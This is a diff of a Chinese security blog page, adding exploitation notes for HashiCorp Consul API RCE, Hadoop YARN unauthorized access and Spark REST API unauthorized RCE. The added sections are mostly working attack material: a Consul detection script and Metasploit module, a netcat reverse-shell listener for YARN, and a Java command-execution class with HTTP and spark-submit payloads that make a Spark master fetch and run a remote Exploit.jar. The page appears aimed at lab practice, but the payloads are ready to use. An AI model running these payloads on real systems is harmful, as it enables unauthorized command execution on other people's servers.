href="#2-Java-RMI-Registry-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-lt-jdk8u232-b09"><span class="nav-text">2. Java RMI Registry 反序列化漏洞(&lt;jdk8u232_b09)</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x11-Apache-Hadoop-x2F-Spark"><span class="nav-text">0x11 Apache Hadoop&#x2F;Spark</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-Hadoop-YARN-ResourceManager-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE"><span class="nav-text">1. Hadoop YARN ResourceManager 未授权访问</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-Spark-REST-API%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90"><span class="nav-text">2. Spark REST API未授权漏洞利用分析</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0xFF-Reference"><span class="nav-text">0xFF Reference</span></a></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -1251,17 +1251,125 @@ success
 <li><a target="_blank" rel="noopener" href="https://packetstormsecurity.com/files/160849/Apache-Flink-1.11.0-Arbitrary-File-Read-Directory-Traversal.html">https://packetstormsecurity.com/files/160849/Apache-Flink-1.11.0-Arbitrary-File-Read-Directory-Traversal.html</a></li>
 <li><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/260184.html">https://www.freebuf.com/vuls/260184.html</a></li>
 </ul>
-<h2 id="0x0B-HashiCorp-Consul"><a href="#0x0B-HashiCorp-Consul" class="headerlink" title="0x0B HashiCorp Consul"></a>0x0B HashiCorp Consul</h2><h3 id="1-HashiCorp-Consul-API-远程命令执行漏洞"><a href="#1-HashiCorp-Consul-API-远程命令执行漏洞" class="headerlink" title="1. HashiCorp Consul API 远程命令执行漏洞"></a>1. HashiCorp Consul API 远程命令执行漏洞</h3><p><strong>漏洞描述</strong></p>
+<h2 id="0x0B-HashiCorp-Consul"><a href="#0x0B-HashiCorp-Consul" class="headerlink" title="0x0B HashiCorp Consul"></a>0x0B HashiCorp Consul</h2><h3 id="HashiCorp-Consul-API-远程命令执行漏洞"><a href="#HashiCorp-Consul-API-远程命令执行漏洞" class="headerlink" title="HashiCorp Consul API 远程命令执行漏洞"></a>HashiCorp Consul API 远程命令执行漏洞</h3><p><strong>漏洞描述</strong></p>
 <p>HashiCorp Consul是一个服务网格，用于服务发现、运行时配置和微服务应用程序和基础设施的服务分割。<br>在特定配置下，恶意攻击者可以通过发送精心构造的HTTP请求在未经授权的情况下在 Consul 服务端远程执行命令</p>
+<p><strong>前提条件</strong></p>
+<p>启用了脚本检查参数（-enable-script-checks）的所有版本</p>
+<p><strong>环境搭建</strong></p>
+<pre class="language-none"><code class="language-none">1) 下载安装
+
+下载地址：https:&#x2F;&#x2F;www.consul.io
+
+unzip consul_1.5.2_linux_amd64.zip
+cd consul
+cp -rp consul &#x2F;bin&#x2F;
+
+2) 创建配置文件
+
+consul_config.json
+
+&#123;
+
+  &quot;datacenter&quot;: &quot;consul-cluster&quot;,
+
+  &quot;node_name&quot;: &quot;consul01&quot;,
+
+  &quot;server&quot;: true,
+
+  &quot;bind_addr&quot;: &quot;192.168.10.6&quot;,
+
+  &quot;bootstrap_expect&quot;: 5,
+
+  &quot;data_dir&quot;: &quot;&#x2F;data&#x2F;consul&#x2F;data&quot;,
+
+  &quot;http_config&quot;: &#123;
+
+    &quot;response_headers&quot;: &#123;
+
+      &quot;Access-Control-Allow-Origin&quot;: &quot;*&quot;
+
+    &#125;
+
+  &#125;,
+
+  &quot;log_level&quot;: &quot;INFO&quot;,
+
+  &quot;enable_syslog&quot;: true,
+
+  &quot;ports&quot;: &#123;
+
+    &quot;http&quot;: 8500,
+
+    &quot;dns&quot;: 8600,
+
+    &quot;serf_lan&quot;: 8301,
+
+    &quot;serf_wan&quot;: 8302
+
+  &#125;,
+
+  &quot;enable_script_checks&quot;: true
+
+&#125;
+
+3) 启动服务
+
+consul agent -config-dir&#x3D;&#x2F;opt&#x2F;consul.d  -ui -client 0.0.0.0
+
+consul members  # 确认服务状态</code></pre>
+
+<p><strong>漏洞利用</strong></p>
+<p>漏洞检测</p>
+<pre class="language-none"><code class="language-none">curl --request GET https:&#x2F;&#x2F;192.168.10.6:8500&#x2F;v1&#x2F;agent&#x2F;self
+
+# 出现 &quot;EnableRemoteScriptChecks&quot;:true 证明漏洞存在</code></pre>
+
+<p>POC</p>
+<pre class="language-none"><code class="language-none">import requests
+import argparse
+from requests.packages import urllib3
+urllib3.disable_warnings()
+from colorama import init
+init(autoreset&#x3D;True)
+import json
+headers&#x3D;&#123;
+&#39;User-Agent&#39;: &#39;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko&#x2F;20100101 Firefox&#x2F;78.0&#39;
+&#125;
+def url():
+	des&#x3D;&quot;HashiCorp Consul API 远程命令执行漏洞POC&quot;
+	parser &#x3D; argparse.ArgumentParser(description&#x3D;des)
+	parser.add_argument(&#39;target_url&#39;,type&#x3D;str,help&#x3D;&#39;The target address,example: http:&#x2F;&#x2F;192.168.10.6&#39;)
+	args &#x3D; parser.parse_args() 
+	target_url &#x3D; args.target_url
+	print(&quot;HashiCorp Consul API 远程命令执行漏洞POC&quot;)
+	print(&quot;[-]正在执行检测...&quot;)
+	print(f&quot;[-]目标地址：&#123;target_url&#125;&quot;,)
+	return target_url
+def check(target_url):
+	url &#x3D; target_url + &#39;&#x2F;v1&#x2F;agent&#x2F;self&#39;
+	try:
+		response &#x3D; requests.get(url&#x3D;url,headers&#x3D;headers,verify&#x3D;False,timeout&#x3D;5).text
+		value &#x3D; json.loads(response)[&#39;DebugConfig&#39;][&#39;EnableRemoteScriptChecks&#39;]
+		if str(value) &#x3D;&#x3D; &#39;True&#39;:
+			print(&#39;\033[0;31m[+]漏洞存在\033[0m&#39;)
+		else:
+			print(&#39;漏洞不存在&#39;)
+	except Exception as a:
+		print(&#39;漏洞不存在&#39;)
+	
+if __name__ &#x3D;&#x3D; &#39;__main__&#39;:
+	target_url &#x3D; url()
+	check(target_url)</code></pre>
+
+<p>msf exploit</p>
+<pre class="language-none"><code class="language-none">msf5 &gt; use exploit&#x2F;multi&#x2F;misc&#x2F;consul_service_exec</code></pre>
+
 <p>refer:</p>
 <ul>
-<li><a target="_blank" rel="noopener" href="https://help.aliyun.com/document_detail/118853.html">https://help.aliyun.com/document_detail/118853.html</a></li>
-</ul>
-<h3 id="2-HashiCorp-Consul-RemoteExec-远程命令执行漏洞"><a href="#2-HashiCorp-Consul-RemoteExec-远程命令执行漏洞" class="headerlink" title="2. HashiCorp Consul RemoteExec 远程命令执行漏洞"></a>2. HashiCorp Consul RemoteExec 远程命令执行漏洞</h3><p><strong>漏洞描述</strong></p>
-<p>在特定配置下，恶意攻击者可以通过发送精心构造的HTTP请求在未经授权的情况下在Consul服务端远程执行命令</p>
-<p>refer: </p>
-<ul>
-<li><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/46074">https://www.exploit-db.com/exploits/46074</a></li>
+<li><p><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/46074">https://www.exploit-db.com/exploits/46074</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://help.aliyun.com/document_detail/118853.html">https://help.aliyun.com/document_detail/118853.html</a></p>
+</li>
 </ul>
 <h2 id="0x0D-JBoss"><a href="#0x0D-JBoss" class="headerlink" title="0x0D JBoss"></a>0x0D JBoss</h2><h3 id="1-JBoss-5-x-x2F-6-x-反序列化漏洞（CVE-2017-12149）"><a href="#1-JBoss-5-x-x2F-6-x-反序列化漏洞（CVE-2017-12149）" class="headerlink" title="1. JBoss 5.x&#x2F;6.x 反序列化漏洞（CVE-2017-12149）"></a>1. JBoss 5.x&#x2F;6.x 反序列化漏洞（CVE-2017-12149）</h3><p><strong>漏洞描述</strong></p>
 <p>Red Hat JBoss是一套开源、基于J2EE的中间件平台。该平台主要用于构建、部署和托管Java应用程序与服务。</p>
@@ -1613,6 +1721,127 @@ java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 8888 Co
 &#x2F;&#x2F; 发起攻击
 java -cp target&#x2F;ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.RMIRegistryExploit2 192.168.31.88 1099 jrmphost 8888</code></pre>
 
+<h2 id="0x11-Apache-Hadoop-x2F-Spark"><a href="#0x11-Apache-Hadoop-x2F-Spark" class="headerlink" title="0x11 Apache Hadoop&#x2F;Spark"></a>0x11 Apache Hadoop&#x2F;Spark</h2><h3 id="1-Hadoop-YARN-ResourceManager-未授权访问"><a href="#1-Hadoop-YARN-ResourceManager-未授权访问" class="headerlink" title="1. Hadoop YARN ResourceManager 未授权访问"></a>1. Hadoop YARN ResourceManager 未授权访问</h3><p><strong>漏洞描述</strong></p>
+<p>Hadoop是一个由Apache基金会所开发的分布式系统基础架构，YARN是hadoop系统上的资源统一管理平台，其主要作用是实现集群资源的统一管理和调度，可以把MapReduce计算框架作为一个应用程序运行在YARN系统之上，通过YARN来管理资源。</p>
+<p>YARN提供有默认开放在8088和8090的REST API（默认前者）允许用户直接通过API进行相关的应用创建、任务提交执行等操作，如果配置不当，REST API将会开放在公网导致未授权访问，利用其远程执行命令。</p>
+<p><strong>环境搭建</strong></p>
+<p>使用vulhub搭建环境，环境启动后，访问 <a target="_blank" rel="noopener" href="http://your-ip:8088/">http://your-ip:8088</a> 即可看到Hadoop YARN ResourceManager WebUI页面</p>
+<p><strong>漏洞利用</strong></p>
+<p>利用过程：</p>
+<pre class="language-none"><code class="language-none">1) 在本地监听等待反弹 shell 连接
+
+2) 调用 New Application API 创建 Application
+
+3) 调用 Submit Application API 提交</code></pre>
+
+<p>利用<a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/blob/master/hadoop/unauthorized-yarn/exploit.py">exp</a> 修改lhost反弹shell的IP即可</p>
+<pre class="language-none"><code class="language-none"># 监听666端口，然后运行exp即可收获shell
+
+nc -lnvp 6666
+python exploit.py</code></pre>
+
+<p>refer: </p>
+<ul>
+<li><a target="_blank" rel="noopener" href="http://archive.hack.lu/2016/Wavestone%20-%20Hack.lu%202016%20-%20Hadoop%20safari%20-%20Hunting%20for%20vulnerabilities%20-%20v1.0.pdf">http://archive.hack.lu/2016/Wavestone%20-%20Hack.lu%202016%20-%20Hadoop%20safari%20-%20Hunting%20for%20vulnerabilities%20-%20v1.0.pdf</a></li>
+</ul>
+<h3 id="2-Spark-REST-API未授权漏洞利用分析"><a href="#2-Spark-REST-API未授权漏洞利用分析" class="headerlink" title="2. Spark REST API未授权漏洞利用分析"></a>2. Spark REST API未授权漏洞利用分析</h3><p><strong>漏洞描述</strong></p>
+<p>Apache Spark 是专为大规模数据处理而设计的快速通用的计算引擎，是开源的类Hadoop MapReduce的通用并行框架。为了让使用者能够方便的控制系统进行计算和查看任务结果，Spark也提供了 WEB UI图形化界面和相应的 REST API来方便用户操作。</p>
+<p>Spark权限设置不当，可能导致攻击者无需认证即可通过该 REST API来操作Spark创建任务、删除任务、查看任务结果等，从而最终获得执行任意指令的能力</p>
+<p><strong>漏洞环境</strong></p>
+<p>使用vulhub，执行如下命令，将以standalone模式启动一个Apache Spark集群，集群里有一个master与一个slave：</p>
+<pre class="language-none"><code class="language-none">docker-compose up -d</code></pre>
+
+<p>环境启动后，访问<a target="_blank" rel="noopener" href="http://your-ip:8080/">http://your-ip:8080</a> 即可看到master的管理页面，访问<a target="_blank" rel="noopener" href="http://your-ip:8081/">http://your-ip:8081</a> 即可看到slave的管理页面</p>
+<p><strong>漏洞利用</strong></p>
+<p>该漏洞本质是未授权的用户可以向管理节点提交一个应用（恶意代码）</p>
+<p>提交方式有两种：</p>
+<pre class="language-none"><code class="language-none">1) 利用REST API
+
+2) 利用submissions网关（集成在7077端口中）</code></pre>
+
+<p>应用可以是Java或Python，就是一个最简单的类:</p>
+<pre class="language-none"><code class="language-none">import java.io.BufferedReader;
+import java.io.InputStreamReader;
+
+public class Exploit &#123;
+  public static void main(String[] args) throws Exception &#123;
+    String[] cmds &#x3D; args[0].split(&quot;,&quot;);
+
+    for (String cmd : cmds) &#123;
+      System.out.println(cmd);
+      System.out.println(executeCommand(cmd.trim()));
+      System.out.println(&quot;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&quot;);
+    &#125;
+  &#125;
+
+  &#x2F;&#x2F; https:&#x2F;&#x2F;www.mkyong.com&#x2F;java&#x2F;how-to-execute-shell-command-from-java&#x2F;
+  private static String executeCommand(String command) &#123;
+    StringBuilder output &#x3D; new StringBuilder();
+
+    try &#123;
+      Process p &#x3D; Runtime.getRuntime().exec(command);
+      p.waitFor();
+      BufferedReader reader &#x3D; new BufferedReader(new InputStreamReader(p.getInputStream()));
+
+      String line;
+      while ((line &#x3D; reader.readLine()) !&#x3D; null) &#123;
+        output.append(line).append(&quot;\n&quot;);
+      &#125;
+    &#125; catch (Exception e) &#123;
+      e.printStackTrace();
+    &#125;
+
+    return output.toString();
+  &#125;
+&#125;</code></pre>
+
+<p>将其编译成JAR，放在任意一个HTTP或FTP上，如<a target="_blank" rel="noopener" href="https://github.com/aRe00t/rce-over-spark/raw/master/Exploit.jar">https://github.com/aRe00t/rce-over-spark/raw/master/Exploit.jar</a></p>
+<p><strong>用REST API方式提交应用</strong></p>
+<p>standalone模式下，master将在6066端口启动一个HTTP服务器，向这个端口提交REST格式的API：</p>
+<pre class="language-none"><code class="language-none">POST &#x2F;v1&#x2F;submissions&#x2F;create HTTP&#x2F;1.1
+Host: your-ip:6066
+Accept-Encoding: gzip, deflate
+Accept: *&#x2F;*
+Accept-Language: en
+User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)
+Content-Type: application&#x2F;json
+Connection: close
+Content-Length: 680
+
+&#123;
+  &quot;action&quot;: &quot;CreateSubmissionRequest&quot;,
+  &quot;clientSparkVersion&quot;: &quot;2.3.1&quot;,
+  &quot;appArgs&quot;: [
+    &quot;whoami,w,cat &#x2F;proc&#x2F;version,ifconfig,route,df -h,free -m,netstat -nltp,ps auxf&quot;
+  ],
+  &quot;appResource&quot;: &quot;https:&#x2F;&#x2F;github.com&#x2F;aRe00t&#x2F;rce-over-spark&#x2F;raw&#x2F;master&#x2F;Exploit.jar&quot;,
+  &quot;environmentVariables&quot;: &#123;
+    &quot;SPARK_ENV_LOADED&quot;: &quot;1&quot;
+  &#125;,
+  &quot;mainClass&quot;: &quot;Exploit&quot;,
+  &quot;sparkProperties&quot;: &#123;
+    &quot;spark.jars&quot;: &quot;https:&#x2F;&#x2F;github.com&#x2F;aRe00t&#x2F;rce-over-spark&#x2F;raw&#x2F;master&#x2F;Exploit.jar&quot;,
+    &quot;spark.driver.supervise&quot;: &quot;false&quot;,
+    &quot;spark.app.name&quot;: &quot;Exploit&quot;,
+    &quot;spark.eventLog.enabled&quot;: &quot;true&quot;,
+    &quot;spark.submit.deployMode&quot;: &quot;cluster&quot;,
+    &quot;spark.master&quot;: &quot;spark:&#x2F;&#x2F;your-ip:6066&quot;
+  &#125;
+&#125;</code></pre>
+
+<p>其中，spark.jars即是编译好的应用，mainClass是待运行的类，appArgs是传给应用的参数</p>
+<p>返回的包中有submissionId，然后访问 <a target="_blank" rel="noopener" href="http://your-ip:8081/logPage/?driverId=%7BsubmissionId%7D&amp;logType=stdout%EF%BC%8C%E5%8D%B3%E5%8F%AF%E6%9F%A5%E7%9C%8B%E6%89%A7%E8%A1%8C%E7%BB%93%E6%9E%9C">http://your-ip:8081/logPage/?driverId={submissionId}&amp;logType=stdout，即可查看执行结果</a></p>
+<p>注意：提交应用是在master中，查看结果是在具体执行这个应用的slave里（默认8081端口）。实际情况，slave可能有多个</p>
+<p><strong>利用submissions网关</strong></p>
+<p>如果6066端口不能访问，或做了权限控制，可以利用master的主端口7077，来提交应用</p>
+<p>方法是利用Apache Spark自带的脚本 bin&#x2F;spark-submit：</p>
+<pre class="language-none"><code class="language-none">bin&#x2F;spark-submit --master spark:&#x2F;&#x2F;your-ip:7077 --deploy-mode cluster --class Exploit https:&#x2F;&#x2F;github.com&#x2F;aRe00t&#x2F;rce-over-spark&#x2F;raw&#x2F;master&#x2F;Exploit.jar id</code></pre>
+
+<p>注意：如果指定的master参数是rest服务器，这个脚本会先尝试使用rest api来提交应用；如果发现不是rest服务器，则会降级到使用submission gateway来提交应用。</p>
+<p>refer:</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2490">https://xz.aliyun.com/t/2490</a></li>
+</ul>
 <h2 id="0xFF-Reference"><a href="#0xFF-Reference" class="headerlink" title="0xFF Reference"></a>0xFF Reference</h2><ul>
 <li><p><a target="_blank" rel="noopener" href="https://javasec.org/">https://javasec.org/</a></p>
 </li>
